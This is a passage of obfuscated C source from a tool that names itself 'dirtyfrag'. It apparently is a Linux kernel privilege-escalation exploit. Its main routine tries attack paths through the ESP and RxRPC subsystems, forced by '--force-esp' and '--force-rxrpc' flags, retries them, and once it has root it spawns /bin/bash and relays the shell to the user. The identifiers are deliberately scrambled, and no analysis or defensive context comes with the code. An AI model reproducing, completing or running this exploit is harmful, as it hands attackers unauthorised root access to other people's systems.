(void)niQtHbwyjt0Q(K9Sb07Y_EHYs,MIJLq5smlqvE,UPLP_8xKA_Tg);
}
if(pfds[1].revents&(POLLHUP|POLLERR))
break;
if(!FWRZCFA74Fme&&!ue5X_v8ExCLu&&eHOwmphDcI7C>=1500){
(void)niQtHbwyjt0Q(K9Sb07Y_EHYs,"\n",1);
FWRZCFA74Fme=1;
}
int vmEjAfiJQStC;
pid_t w=X9CUHnJp5rgE(pid,&vmEjAfiJQStC,WNOHANG);
if(w==pid){
for(int OSKl1gHVulhW=0;OSKl1gHVulhW<5;OSKl1gHVulhW++){
struct pollfd pf={K9Sb07Y_EHYs,POLLIN,0};
if(xDCitq1jlHVM(&pf,1,50)<=0)
break;
FCeyHEe1FNFR UPLP_8xKA_Tg=tAnVbQJ1a4_N(K9Sb07Y_EHYs,MIJLq5smlqvE,sizeof(MIJLq5smlqvE));
if(UPLP_8xKA_Tg<=0)
break;
(void)niQtHbwyjt0Q(STDOUT_FILENO,MIJLq5smlqvE,UPLP_8xKA_Tg);
}
break;
}
}
if(sSfS51wdoNX1)
VcxJDCxulPcZ(STDIN_FILENO,TCSANOW,&saved_termios);
uTbTPjM3XJjE(K9Sb07Y_EHYs);
return 0;
}
int main(int H2sE8d2gKqV4,char**i8MosvajvkPB)
{
int e80J_WHxRuqt=(nFbyvbuS6mq9("DIRTYFRAG_VERBOSE")!=NULL);
int R2HtTpEba0n_=0,force_rxrpc=0;
int vOLUhHItyI9k=-1;
int wbApfH2B4e4V=1;
int AhkHAT0KKCmm;
char**RvwISB9_2yc1;
for(int OSKl1gHVulhW=1;OSKl1gHVulhW<H2sE8d2gKqV4;OSKl1gHVulhW++){
if(!z0fxCLkJRZNa(i8MosvajvkPB[OSKl1gHVulhW],"--force-esp"))
R2HtTpEba0n_=1;
else if(!z0fxCLkJRZNa(i8MosvajvkPB[OSKl1gHVulhW],"--force-rxrpc"))
force_rxrpc=1;
else if(!z0fxCLkJRZNa(i8MosvajvkPB[OSKl1gHVulhW],"-v")||
!z0fxCLkJRZNa(i8MosvajvkPB[OSKl1gHVulhW],"--verbose"))
e80J_WHxRuqt=1;
}
if(Xd7pjih6oB0K()==0){
CI9G37imnInx("/bin/bash","bash",(char*)NULL);
DQkpKHNl35S4(1);
}
RvwISB9_2yc1=YCdOcOOgEmeR(H2sE8d2gKqV4,i8MosvajvkPB,&AhkHAT0KKCmm);
if(!e80J_WHxRuqt)
hUoGIdidXbQs(&vOLUhHItyI9k);
if(force_rxrpc){
wbApfH2B4e4V=u6ofGdno8mCH(AhkHAT0KKCmm,RvwISB9_2yc1);
for(int OSKl1gHVulhW=0;!VCQo6YkUeaze()&&OSKl1gHVulhW<3;OSKl1gHVulhW++)
wbApfH2B4e4V=u6ofGdno8mCH(AhkHAT0KKCmm,RvwISB9_2yc1);
}else if(R2HtTpEba0n_){
wbApfH2B4e4V=vJT7o8MyyBW7(AhkHAT0KKCmm,RvwISB9_2yc1);
}else{
wbApfH2B4e4V=vJT7o8MyyBW7(AhkHAT0KKCmm,RvwISB9_2yc1);
if(!V9Wtt6k5Noa7()){
wbApfH2B4e4V=u6ofGdno8mCH(AhkHAT0KKCmm,RvwISB9_2yc1);
for(int OSKl1gHVulhW=0;!VCQo6YkUeaze()&&OSKl1gHVulhW<3;OSKl1gHVulhW++)
wbApfH2B4e4V=u6ofGdno8mCH(AhkHAT0KKCmm,RvwISB9_2yc1);
}
}
int AGQ0iqr6MiSn=KnlEjMD56S_g();
if(!e80J_WHxRuqt)
dz7oYAG4lO3O(vOLUhHItyI9k);
if(AGQ0iqr6MiSn){
(void)wPfQT3GhZl8j();
return 0;
}
KbYaiI1h3XrQ(2,"dirtyfrag: failed (rc=%d)\n",wbApfH2B4e4V);
return wbApfH2B4e4V ? wbApfH2B4e4V : 1;
}